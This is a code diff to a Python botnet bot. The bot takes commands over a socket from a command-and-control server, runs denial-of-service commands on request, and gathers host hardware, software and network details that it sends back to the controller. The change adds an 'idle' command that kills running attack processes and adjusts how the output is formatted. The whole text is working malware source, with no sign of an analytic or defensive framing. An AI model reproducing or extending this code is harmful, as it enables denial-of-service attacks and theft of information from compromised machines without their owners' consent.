@@ -22,9 +22,9 @@ def exec_cmd(cmd, wait=False):
 
 def steal_info_hwsw():
     return {
-        "uname": exec_cmd(["uname", "-a"]),
-        "lscpu": exec_cmd(["lscpu"]),
-        "network": exec_cmd(["netstat", "-i"])
+        "uname": exec_cmd(["uname", "-a"]).split('\n'),
+        "lscpu": exec_cmd(["lscpu"]).split('\n'),
+        "network": exec_cmd(["netstat", "-i"]).split('\n')
     }
 
 def handle_irc_connection(server_socket):
@@ -35,6 +35,10 @@ def handle_irc_connection(server_socket):
         data = conn.recv(1024).decode()
         if not data or data == "kill" or data == 'exit':
             break
+        elif data == 'idle':
+            print("[+] Making bot idle")
+            [proc.kill() for proc in CURRENT_PROCESSES]
+            continue
         data = str(data)
         print("from C&C: " + data)
         action_type, action = data.split(":")
@@ -42,7 +46,7 @@ def handle_irc_connection(server_socket):
             print("[+] Executing dos as C&C asked")
             exec_cmd(action.split(), wait=True)
         elif action_type == "hwsw":
-            print("[+] Extracting info on hw and sw info as C&C asked")
+            print("[+] Extracting info about hw and sw as C&C asked")
             infos = steal_info_hwsw()
             conn.send(json.dumps(infos, indent=2).encode('utf-8'))
     conn.close()  # close the connection
